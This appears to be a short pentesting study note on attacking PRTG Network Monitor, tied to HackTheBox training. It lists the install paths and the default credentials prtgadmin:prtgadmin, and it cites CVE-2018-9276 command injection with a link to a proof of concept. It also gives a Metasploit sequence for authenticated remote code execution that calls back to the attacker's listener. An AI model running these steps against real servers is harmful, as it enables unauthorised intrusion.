# PRTG Network Monitor

[![attacking_common_applications](../../../../cybersecurity/_badges/htb/attacking_common_applications.svg)](https://academy.hackthebox.com/course/preview/attacking-common-applications)
[![netmon](../../../../cybersecurity/_badges/htb-p/netmon.svg)](https://app.hackthebox.com/machines/Netmon)

<div class="row row-cols-lg-2"><div>

[Paessler PRTG](https://en.wikipedia.org/wiki/Paessler_PRTG)  is an network monitoring software. On Windows, there are two folders, one for the program, another for the data:

```makefile!
C:\Program Files (x86)\PRTG Network Monitor
C:\ProgramData\Paessler\PRTG Network Monitor
```

If we have admin access, we can exploit a RCE.
</div><div>

For instance, with [metasploit](/cybersecurity/red-team/tools/frameworks/metasploit/index.md):

```shell!
$ msfconsole -q
msf6> use windows/http/prtg_authenticated_rce
msf6> set RHOSTS <ip>
msf6> set LHOST tun0
msf6> run # try default password
msf6> set ADMIN_PASSWORD <password>
msf6> run
```
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* Default credentials (`prtgadmin:prtgadmin`)
* Nmap (`Indy httpd <version>`)
* [CVE-2018-9276](https://nvd.nist.gov/vuln/detail/CVE-2018-9276) (`<18.2.39`): command injection ([poc](https://github.com/wildkindcc/CVE-2018-9276/tree/master))
</div><div>
</div></div>